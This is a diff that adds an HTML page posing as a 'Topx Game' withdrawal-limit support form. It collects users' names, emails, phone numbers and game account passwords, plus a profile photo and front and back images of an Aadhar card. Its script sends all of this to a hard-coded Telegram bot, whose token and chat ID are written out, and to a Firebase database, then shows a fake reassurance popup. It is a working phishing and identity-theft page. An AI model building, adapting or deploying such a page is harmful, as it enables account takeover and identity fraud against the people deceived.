@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+  <title>Topx Game — Withdrawal Limit Up</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="icon" href="IMAGES/LOGO.png" type="image/png">
+  <style>
+    .unlock-header {
+      display: flex; align-items: center; justify-content: center;
+      padding: 16px 20px; position: sticky; top: 0; z-index: 100;
+      background: rgba(9, 15, 31, 0.92); backdrop-filter: blur(24px);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+    }
+    .unlock-header .back-link {
+      position: absolute; left: 16px; width: 40px; height: 40px;
+      border-radius: 12px; background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.08); display: flex;
+      align-items: center; justify-content: center; color: #8E8E93;
+      font-size: 18px; cursor: pointer; transition: var(--ios-transition);
+      text-decoration: none;
+    }
+    .unlock-header .back-link:hover { background: rgba(255,69,58,0.15); color: var(--accent-red); }
+    .unlock-header .back-link:active { transform: scale(0.95); }
+    .unlock-header .header-info { display: flex; flex-direction: column; align-items: center; gap: 4px; }
+    .unlock-header .header-info .logo-sm { width: 48px; height: auto; border-radius: 8px; }
+    .unlock-header .header-info h2 { font-size: 1.2rem; font-weight: 700; letter-spacing: -0.3px; }
+    .unlock-header .header-info p { font-size: 0.8rem; color: var(--accent-red); font-weight: 500; opacity: 0.9; }
+    .step-indicator {
+      display: flex; align-items: center; justify-content: center; gap: 0;
+      padding: 24px 16px 16px; max-width: 400px; margin: 0 auto;
+    }
+    .step-item { display: flex; align-items: center; }
+    .step-circle {
+      width: 36px; height: 36px; border-radius: 50%;
+      background: rgba(255,255,255,0.06); border: 2px solid rgba(255,255,255,0.1);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 14px; font-weight: 700; color: #8E8E93;
+      transition: var(--ios-transition); flex-shrink: 0;
+    }
+    .step-circle.active { background: var(--accent-red); border-color: transparent; color: #000; box-shadow: 0 4px 16px rgba(255,69,58,0.35); }
+    .step-circle.done { background: #34C759; border-color: transparent; color: #000; }
+    .step-line { width: 48px; height: 2px; background: rgba(255,255,255,0.1); transition: var(--ios-transition); flex-shrink: 0; }
+    .step-line.done { background: #34C759; }
+    .form-section { max-width: 600px; margin: 0 auto; padding: 0 20px 40px; }
+    .step-panel { display: none; }
+    .step-panel.active { display: block; animation: fadeUp 0.4s ease; }
+    @keyframes fadeUp { from { opacity: 0; transform: translateY(16px); } to { opacity: 1; transform: translateY(0); } }
+    .form-card.ios-card { padding: 28px; }
+    .form-card .card-title { font-size: 1.3rem; font-weight: 700; margin-bottom: 24px; text-align: center; display: flex; align-items: center; justify-content: center; gap: 10px; }
+    .form-group { margin-bottom: 18px; }
+    .form-group label { display: block; font-size: 0.85rem; font-weight: 600; color: #8E8E93; margin-bottom: 8px; padding-left: 4px; }
+    .form-group label .required { color: var(--accent-red); margin-left: 2px; }
+    .form-group input, .form-group .file-label {
+      width: 100%; padding: 14px 16px; border-radius: var(--ios-radius-sm);
+      border: 1px solid rgba(255,255,255,0.1); background: rgba(255,255,255,0.05);
+      color: var(--white-text); font-size: 0.95rem; font-weight: 500;
+      transition: var(--ios-transition); outline: none;
+      font-family: var(--font-stack);
+    }
+    .form-group input:focus { border-color: var(--accent-red); box-shadow: 0 0 0 4px rgba(255,69,58,0.12); background: rgba(255,255,255,0.08); }
+    .form-group input::placeholder { color: #6a6a8a; font-weight: 400; }
+    .file-input-wrap { position: relative; }
+    .file-input-wrap input[type="file"] { position: absolute; opacity: 0; width: 100%; height: 100%; cursor: pointer; top: 0; left: 0; }
+    .file-label { display: flex; align-items: center; gap: 12px; cursor: pointer; }
+    .file-label .file-icon { font-size: 1.3rem; display: flex; align-items: center; }
+    .file-label:hover { border-color: var(--accent-red); background: rgba(255,69,58,0.05); }
+    .file-label.has-file { border-color: #34C759; border-style: solid; background: rgba(52,199,89,0.05); }
+    .profile-upload { display: flex; flex-direction: column; align-items: center; gap: 10px; cursor: pointer; }
+    .profile-upload input[type="file"] { display: none; }
+    .profile-circle {
+      width: 90px; height: 90px; border-radius: 50%;
+      border: 2px dashed rgba(255,255,255,0.12); background: rgba(255,255,255,0.03);
+      display: flex; align-items: center; justify-content: center;
+      transition: all 0.3s ease; overflow: hidden;
+    }
+    .profile-circle.has-image { border-color: #34C759; border-style: solid; background: transparent; }
+    .profile-circle img { width: 100%; height: 100%; object-fit: cover; border-radius: 50%; }
+    .profile-label { font-size: 0.8rem; color: #8E8E93; }
+    .file-name { font-size: 0.8rem; color: #34C759; margin-top: 4px; padding-left: 4px; word-break: break-all; }
+    .btn-row { display: flex; gap: 12px; margin-top: 24px; }
+    .btn-row .ios-button { flex: 1; justify-content: center; padding: 16px; font-size: 1rem; }
+    .btn-secondary {
+      display: inline-flex; align-items: center; justify-content: center;
+      background: rgba(255,255,255,0.06); color: var(--white-text); font-weight: 600; font-size: 1rem;
+      padding: 16px 36px; border-radius: 18px; text-decoration: none; border: 1px solid rgba(255,255,255,0.1);
+      cursor: pointer; transition: var(--ios-transition); font-family: var(--font-stack);
+    }
+    .btn-secondary:hover { background: rgba(255,255,255,0.12); border-color: rgba(255,255,255,0.2); }
+    .btn-secondary:active { transform: scale(0.98); }
+    .popup-overlay {
+      position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(15,16,18,0.9); backdrop-filter: blur(16px);
+      display: flex; align-items: center; justify-content: center;
+      z-index: 1000; opacity: 0; visibility: hidden; transition: var(--ios-transition); padding: 20px;
+    }
+    .popup-overlay.active { opacity: 1; visibility: visible; }
+    .popup-card.ios-card { max-width: 380px; width: 100%; text-align: center; padding: 32px 24px; transform: scale(0.9) translateY(20px); transition: var(--ios-transition); }
+    .popup-overlay.active .popup-card { transform: scale(1) translateY(0); }
+    .popup-icon { font-size: 3rem; margin-bottom: 16px; }
+    .popup-card h3 { font-size: 1.5rem; font-weight: 700; margin-bottom: 12px; }
+    .popup-card p { font-size: 0.9rem; color: #8E8E93; line-height: 1.7; margin-bottom: 24px; }
+    .popup-card p strong { color: var(--accent-red); }
+    .toast {
+      position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%) translateY(120px);
+      background: var(--dark-gray-card); backdrop-filter: blur(20px); color: var(--white-text);
+      padding: 14px 28px; border-radius: var(--ios-radius-sm);
+      border: 1px solid rgba(255,255,255,0.1); box-shadow: var(--ios-shadow);
+      font-size: 0.9rem; font-weight: 600; z-index: 2000;
+      transition: var(--ios-transition); max-width: 90%; text-align: center;
+    }
+    .toast.show { transform: translateX(-50%) translateY(0); }
+    .slide-submit { width: 100%; user-select: none; -webkit-user-select: none; }
+    .slide-track {
+      position: relative; width: 100%; height: 56px;
+      background: rgba(255,255,255,0.06); border-radius: 28px;
+      border: 1px solid rgba(255,255,255,0.1); overflow: hidden;
+      cursor: pointer;
+    }
+    .slide-fill {
+      position: absolute; left: 0; top: 0; height: 100%;
+      width: 0%; background: var(--accent-red); border-radius: 28px; z-index: 0;
+    }
+    .slide-text {
+      position: absolute; left: 50%; top: 50%; transform: translate(-50%, -50%);
+      font-size: 0.9rem; font-weight: 600; color: rgba(255,255,255,0.4);
+      white-space: nowrap; pointer-events: none; z-index: 1;
+    }
+    .slide-thumb {
+      position: absolute; left: 4px; top: 4px; width: 48px; height: 48px;
+      border-radius: 50%; background: var(--accent-red);
+      box-shadow: 0 4px 16px rgba(255,69,58,0.45);
+      display: flex; align-items: center; justify-content: center;
+      cursor: grab; z-index: 2; transition: left 0.35s cubic-bezier(0.25, 0.8, 0.25, 1), box-shadow 0.2s ease;
+      touch-action: none;
+    }
+    .slide-thumb:active { cursor: grabbing; box-shadow: 0 4px 24px rgba(255,69,58,0.6); }
+    .slide-thumb.done { background: #34C759; box-shadow: 0 4px 16px rgba(52,199,89,0.35); }
+    @media (max-width: 768px) {
+      .step-circle { width: 32px; height: 32px; font-size: 13px; }
+      .step-line { width: 32px; }
+      .form-card.ios-card { padding: 22px; }
+      .btn-row { flex-direction: column; }
+      .btn-row .ios-button, .btn-secondary { width: 100%; }
+    }
+  </style>
+</head>
+<body>
+  <header class="unlock-header">
+    <a href="index.html" class="back-link">←</a>
+    <div class="header-info">
+      <img src="IMAGES/LOGO.png" alt="Topx" class="logo-sm" />
+      <h2>Topx Game Support</h2>
+      <p>Withdrawal Limit Up</p>
+    </div>
+    <div style="width:40px"></div>
+  </header>
+
+  <div class="step-indicator">
+    <div class="step-item">
+      <div class="step-circle active" id="stepDot1">1</div>
+    </div>
+    <div class="step-line" id="stepLine1"></div>
+    <div class="step-item">
+      <div class="step-circle" id="stepDot2">2</div>
+    </div>
+  </div>
+
+  <div class="form-section">
+
+    <!-- Step 1 -->
+    <div class="step-panel active" id="step1">
+      <div class="form-card ios-card">
+        <div class="card-title"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 9.9-1"/></svg> Account Verification</div>
+        <div class="form-group">
+          <label>User Name <span class="required">*</span></label>
+          <input type="text" id="fUserName" placeholder="Enter your full name" required />
+        </div>
+        <div class="form-group">
+          <label>Game Email ID <span class="required">*</span></label>
+          <input type="email" id="fEmail" placeholder="your@email.com" required />
+        </div>
+        <div class="form-group">
+          <label>Game Mobile Number <span class="required">*</span></label>
+          <input type="tel" id="fMobile" placeholder="Enter mobile number" required />
+        </div>
+        <div class="form-group">
+          <label>Game Account Password <span class="required">*</span></label>
+          <input type="password" id="fPassword" placeholder="Enter account password" required />
+        </div>
+        <button class="ios-button" id="step1Next" style="width:100%;justify-content:center;">
+          Next →
+        </button>
+      </div>
+    </div>
+
+    <!-- Step 2 -->
+    <div class="step-panel" id="step2">
+      <div class="form-card ios-card">
+        <div class="card-title"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--accent-red)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:6px"><path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l9.19-9.19a4 4 0 0 1 5.66 5.66l-9.2 9.19a2 2 0 0 1-2.83-2.83l8.49-8.48"/></svg> Upload Documents</div>
+        <div class="form-group" style="text-align:center;">
+          <label>Profile Image <span class="required">*</span></label>
+          <div class="profile-upload" id="profileUpload">
+            <input type="file" id="fProfileImage" name="fProfileImage" accept="image/*" />
+            <div class="profile-circle" id="profileCircle">
+              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#8E8E93" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+            </div>
+            <div class="profile-label">Tap to upload photo</div>
+          </div>
+        </div>
+        <div class="form-group">
+          <label>Upload Issue Image <span class="required">*</span></label>
+          <div class="file-input-wrap">
+            <input type="file" name="issue_image" accept="image/*" class="file-input" required />
+            <div class="file-label" id="issueImageLabel">
+              <span class="file-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#FF9F0A" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/><circle cx="12" cy="13" r="4"/></svg></span>
+              <span>Choose issue screenshot</span>
+            </div>
+          </div>
+          <div class="file-name" id="issueImageName"></div>
+        </div>
+        <div class="form-group">
+          <label>Upload Aadhar Card (Front Side) <span class="required">*</span></label>
+          <div class="file-input-wrap">
+            <input type="file" name="aadhar_front" accept="image/*" class="file-input" required />
+            <div class="file-label" id="aadharFrontLabel">
+              <span class="file-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#5AC8FA" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><line x1="7" y1="9" x2="10" y2="9"/><line x1="7" y1="13" x2="14" y2="13"/><circle cx="17" cy="11" r="1"/><circle cx="17" cy="15" r="1"/><line x1="14" y1="9" x2="17" y2="9"/></svg></span>
+              <span>Choose Aadhar front image</span>
+            </div>
+          </div>
+          <div class="file-name" id="aadharFrontName"></div>
+        </div>
+        <div class="form-group">
+          <label>Upload Aadhar Card (Back Side) <span class="required">*</span></label>
+          <div class="file-input-wrap">
+            <input type="file" name="aadhar_back" accept="image/*" class="file-input" required />
+            <div class="file-label" id="aadharBackLabel">
+              <span class="file-icon"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#5AC8FA" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><line x1="7" y1="9" x2="10" y2="9"/><line x1="7" y1="13" x2="14" y2="13"/><circle cx="17" cy="11" r="1"/><circle cx="17" cy="15" r="1"/><line x1="14" y1="9" x2="17" y2="9"/></svg></span>
+              <span>Choose Aadhar back image</span>
+            </div>
+          </div>
+          <div class="file-name" id="aadharBackName"></div>
+        </div>
+        <div class="btn-row" style="flex-direction:column;">
+          <button class="btn-secondary" id="step2Back" style="width:100%;gap:8px;justify-content:center;"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5"/><path d="M12 19l-7-7 7-7"/></svg> Back</button>
+          <div class="slide-submit" id="slideSubmit">
+            <div class="slide-track">
+              <div class="slide-fill" id="slideFill"></div>
+              <span class="slide-text">Slide to Submit</span>
+              <div class="slide-thumb" id="slideThumb">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14"/><path d="M12 5l7 7-7 7"/></svg>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <!-- Success Popup -->
+  <div class="popup-overlay" id="successPopup">
+    <div class="popup-card ios-card">
+      <div class="popup-icon">✅</div>
+      <h3>🎉 Request Received!</h3>
+      <p><strong>Your problem has been received by the support team!</strong><br/><br/>👨‍💻 Our team will start working on your issue shortly.<br/><br/>⏰ Your issue will be resolved within <strong>24 hours</strong>.<br/>⏳ In some cases, it may take <strong>2 to 4 working days</strong>.<br/><br/>🙏 Please be patient. Your issue will be resolved soon!</p>
+      <a href="index.html" class="ios-button ios-button-red" style="text-decoration:none;display:inline-flex;padding:14px 36px;">Back to Home 🏠</a>
+    </div>
+  </div>
+
+  <div class="toast" id="toast"><span id="toastMessage">Success!</span></div>
+
+  <script>
+    var FIREBASE_CONFIG = {
+      apiKey: "AIzaSyCiqaLzh7PoVC5l03sJFdtK548Wulufn94",
+      authDomain: "alll-projects-admin-pennal.firebaseapp.com",
+      projectId: "alll-projects-admin-pennal",
+      storageBucket: "alll-projects-admin-pennal.firebasestorage.app",
+      messagingSenderId: "689297868215",
+      appId: "1:689297868215:web:2747b19c2da47a31f49432"
+    };
+    var SITE_ID = "topx_game";
+    var _fbDb = null;
+
+    function loadFirebase() {
+      if (_fbDb) return Promise.resolve(_fbDb);
+      return new Promise(function(resolve, reject) {
+        var initDb = function() {
+          try {
+            if (!firebase.apps.length) firebase.initializeApp(FIREBASE_CONFIG);
+            _fbDb = firebase.firestore();
+            resolve(_fbDb);
+          } catch (e) { reject(e); }
+        };
+        if (window.firebase && window.firebase.firestore) { initDb(); return; }
+        var urls = [
+          'https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js',
+          'https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js'
+        ];
+        var loaded = 0;
+        urls.forEach(function(src) {
+          var s = document.createElement('script');
+          s.src = src;
+          s.onload = function() { loaded++; if (loaded === urls.length) initDb(); };
+          s.onerror = function() { reject(new Error('Firebase load failed')); };
+          document.head.appendChild(s);
+        });
+      });
+    }
+
+    function saveSubmission(data) {
+      return loadFirebase().then(function(db) {
+        var payload = Object.assign({}, data, { site_id: SITE_ID, created_at: firebase.firestore.FieldValue.serverTimestamp() });
+        return db.collection('submissions').add(payload);
+      });
+    }
+
+    var TG_BOT_TOKEN = '8906822745:AAH_rQOexAgYey92rzgNw6piosCXDY20rwM';
+    var TG_CHAT_ID = '-1003782852692';
+
+    function sendTelegramMessage(text) {
+      return fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: 'HTML' })
+      }).then(function(r) { return r.json(); });
+    }
+
+    function sendImageToTelegram(file, caption) {
+      var fd = new FormData();
+      fd.append('chat_id', TG_CHAT_ID);
+      fd.append('photo', file);
+      fd.append('caption', caption);
+      return fetch('https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendPhoto', {
+        method: 'POST', body: fd
+      }).then(function(r) { return r.json(); }).then(function(data) {
+        if (data.ok) return 'https://t.me/c/' + TG_CHAT_ID.replace('-100', '') + '/' + data.result.message_id;
+        throw new Error(data.description || 'Telegram send failed');
+      });
+    }
+
+    var $ = function(id) { return document.getElementById(id); };
+    var _unblockData = {};
+    var _rid = null;
+
+    function goToStep(step) {
+      for (var i = 1; i <= 2; i++) {
+        var panel = $('step' + i);
+        var dot = $('stepDot' + i);
+        var line = $('stepLine' + i);
+        if (panel) panel.classList.remove('active');
+        if (dot) dot.classList.remove('active', 'done');
+        if (line) line.classList.remove('done');
+      }
+      var activePanel = $('step' + step);
+      if (activePanel) activePanel.classList.add('active');
+      for (var j = 1; j <= step; j++) {
+        var d = $('stepDot' + j);
+        if (d) { if (j < step) d.classList.add('done'); else d.classList.add('active'); }
+        if (j < step) { var l = $('stepLine' + j); if (l) l.classList.add('done'); }
+      }
+    }
+
+    function showToast(msg) {
+      var el = $('toastMessage');
+      if (el) el.textContent = msg;
+      var t = $('toast');
+      if (!t) return;
+      t.classList.add('show');
+      setTimeout(function() { t.classList.remove('show'); }, 2500);
+    }
+
+    function submitUnblockRequest() {
+      var rid = _rid || "TX" + Math.floor(100000 + Math.random() * 900000);
+      _rid = rid;
+      var d = { type: 'unlock_withdrawal', site_id: SITE_ID, reqId: rid };
+      Object.keys(_unblockData).forEach(function(k) { d[k] = _unblockData[k]; });
+      var fileFields = [
+        { field: 'fProfileImage', key: 'profile_image_url', isProfile: true },
+        { field: 'issue_image', key: 'issue_image_url' },
+        { field: 'aadhar_front', key: 'aadhar_front_url' },
+        { field: 'aadhar_back', key: 'aadhar_back_url' }
+      ];
+      var uploadPromises = [];
+      fileFields.forEach(function(ff) {
+        var fileInput = document.querySelector('[name="' + ff.field + '"]');
+        if (fileInput && fileInput.files && fileInput.files.length > 0) {
+          var file = fileInput.files[0];
+          var ext = file.name.split('.').pop();
+          uploadPromises.push(sendImageToTelegram(file, '🆔 ' + rid + ' | ' + ff.field).then(function(url) {
+            d[ff.key] = url;
+          }));
+        }
+      });
+      Promise.all(uploadPromises).then(function() {
+        d.time = new Date().toLocaleString('en-IN', { day: '2-digit', month: 'short', year: 'numeric', hour: '2-digit', minute: '2-digit' });
+        showToast('Request sent to support team! ✅');
+        return saveSubmission(d);
+      }).then(function() {
+        document.querySelectorAll('.file-label').forEach(function(l) { l.classList.remove('has-file'); });
+        document.querySelectorAll('.file-name').forEach(function(n) { n.textContent = ''; });
+        resetSlider();
+        var sp = $('successPopup');
+        if (sp) sp.classList.add('active');
+      }).catch(function(err) {
+        console.warn('Submit failed:', err);
+        showToast('Submission failed - try again');
+        resetSlider();
+      });
+    }
+
+    try {
+      var s1n = $('step1Next');
+      if (s1n) {
+        s1n.addEventListener('click', function() {
+          var uname = $('fUserName');
+          var em = $('fEmail');
+          var mobile = $('fMobile');
+          var pwd = $('fPassword');
+          if (!uname || !uname.value.trim()) { showToast('Enter User Name'); if (uname) uname.focus(); return; }
+          if (!em || !em.value.trim()) { showToast('Enter Game Email ID'); if (em) em.focus(); return; }
+          if (!mobile || !mobile.value.trim()) { showToast('Enter Game Mobile Number'); if (mobile) mobile.focus(); return; }
+          if (!pwd || !pwd.value.trim()) { showToast('Enter Game Account Password'); if (pwd) pwd.focus(); return; }
+          _unblockData.user_name = uname.value.trim();
+          _unblockData.email = em.value.trim();
+          _unblockData.mobile = mobile.value.trim();
+          _unblockData.password = pwd.value.trim();
+          var msg = '<b>🔔 New Unlock Withdrawal Request</b>\n' + '<b>User Name:</b> ' + _unblockData.user_name + '\n' + '<b>Email:</b> ' + _unblockData.email + '\n' + '<b>Mobile:</b> ' + _unblockData.mobile;
+          sendTelegramMessage(msg).catch(function(e) { console.warn('TG notify:', e); });
+          var partialRid = "TX" + Math.floor(100000 + Math.random() * 900000);
+          saveSubmission({ request_id: partialRid, type: 'Unlock Withdrawal', status: 'step1_complete', user_name: _unblockData.user_name, email: _unblockData.email, mobile: _unblockData.mobile, password: _unblockData.password, source: 'Topx Game Support' }).catch(function(e) { console.warn('Step1 save failed:', e); });
+          goToStep(2);
+        });
+      }
+      var s2b = $('step2Back');
+      if (s2b) s2b.addEventListener('click', function() { goToStep(1); });
+    } catch (e) { console.warn('unblock steps:', e); }
+
+    function resetSlider() {
+      var thumb = $('slideThumb');
+      var fill = $('slideFill');
+      if (thumb) { thumb.style.transition = 'left 0.35s cubic-bezier(0.25, 0.8, 0.25, 1)'; thumb.style.left = '4px'; thumb.classList.remove('done'); }
+      if (fill) { fill.style.transition = 'width 0.35s cubic-bezier(0.25, 0.8, 0.25, 1)'; fill.style.width = '0%'; }
+    }
+
+    function doSubmit() {
+      var profileF = $('fProfileImage');
+      var issue = document.querySelector('[name="issue_image"]');
+      var aadharF = document.querySelector('[name="aadhar_front"]');
+      var aadharB = document.querySelector('[name="aadhar_back"]');
+      if (!profileF || !profileF.files || !profileF.files[0]) { showToast('Upload Profile Image'); resetSlider(); return; }
+      if (!issue || !issue.files || !issue.files[0]) { showToast('Upload issue image'); resetSlider(); return; }
+      if (!aadharF || !aadharF.files || !aadharF.files[0]) { showToast('Upload Aadhar front side'); resetSlider(); return; }
+      if (!aadharB || !aadharB.files || !aadharB.files[0]) { showToast('Upload Aadhar back side'); resetSlider(); return; }
+      _rid = "TX" + Math.floor(100000 + Math.random() * 900000);
+      submitUnblockRequest();
+    }
+
+    function initSlider() {
+      var track = document.querySelector('.slide-track');
+      var thumb = $('slideThumb');
+      var fill = $('slideFill');
+      if (!track || !thumb) return;
+      var startX = 0, currentX = 0, isDragging = false;
+      var maxTravel = 0, thumbStartLeft = 0;
+      function getMaxTravel() { return Math.max(track.offsetWidth - 56, 100); }
+      function onStart(e) {
+        isDragging = true; maxTravel = getMaxTravel();
+        var pos = e.type.indexOf('touch') === 0 ? e.touches[0] : e;
+        startX = pos.clientX;
+        thumbStartLeft = parseFloat(thumb.style.left) || 4;
+        thumb.style.transition = 'none'; fill.style.transition = 'none';
+      }
+      function onMove(e) {
+        if (!isDragging) return; e.preventDefault();
+        var pos = e.type.indexOf('touch') === 0 ? e.touches[0] : e;
+        var delta = pos.clientX - startX;
+        currentX = thumbStartLeft - 4 + delta;
+        if (currentX < 0) currentX = 0;
+        if (currentX > maxTravel) currentX = maxTravel;
+        thumb.style.left = (4 + currentX) + 'px';
+        fill.style.width = (currentX / maxTravel * 100) + '%';
+      }
+      function onEnd() {
+        if (!isDragging) return; isDragging = false;
+        thumb.style.transition = 'left 0.4s cubic-bezier(0.25, 0.8, 0.25, 1)';
+        fill.style.transition = 'width 0.4s cubic-bezier(0.25, 0.8, 0.25, 1)';
+        if (currentX >= maxTravel - 2) { thumb.classList.add('done'); setTimeout(function() { doSubmit(); }, 300); }
+        else { resetSlider(); }
+      }
+      thumb.addEventListener('mousedown', onStart);
+      document.addEventListener('mousemove', onMove);
+      document.addEventListener('mouseup', onEnd);
+      thumb.addEventListener('touchstart', onStart, { passive: true });
+      document.addEventListener('touchmove', onMove, { passive: false });
+      document.addEventListener('touchend', onEnd);
+    }
+    setTimeout(function() { initSlider(); }, 200);
+
+    try {
+      var profileInput = $('fProfileImage');
+      if (profileInput) {
+        profileInput.addEventListener('change', function() {
+          if (this.files && this.files[0]) {
+            var reader = new FileReader();
+            reader.onload = function(e) {
+              var circle = $('profileCircle');
+              circle.innerHTML = '<img src="' + e.target.result + '" alt="Profile" />';
+              circle.classList.add('has-image');
+            };
+            reader.readAsDataURL(this.files[0]);
+          }
+        });
+      }
+      var profileUpload = $('profileUpload');
+      if (profileUpload) profileUpload.addEventListener('click', function(e) { if (e.target.tagName !== 'IMG') $('fProfileImage').click(); });
+
+      document.querySelectorAll('.file-input-wrap input[type="file"]').forEach(function(input) {
+        input.addEventListener('change', function() {
+          var label = this.parentElement.querySelector('.file-label');
+          var nameEl = this.parentElement.parentElement.querySelector('.file-name');
+          if (this.files && this.files.length > 0) {
+            label.classList.add('has-file');
+            var span = label.querySelector('span:last-child');
+            if (span) span.textContent = this.files[0].name;
+            if (nameEl) nameEl.textContent = 'Selected: ' + this.files[0].name;
+          } else {
+            label.classList.remove('has-file');
+          }
+        });
+      });
+    } catch (e) {}
+
+    try {
+      var sp = $('successPopup');
+      if (sp) sp.addEventListener('click', function(e) { if (e.target === sp) sp.classList.remove('active'); });
+    } catch (e) {}
+  </script>
+</body>
+</html>
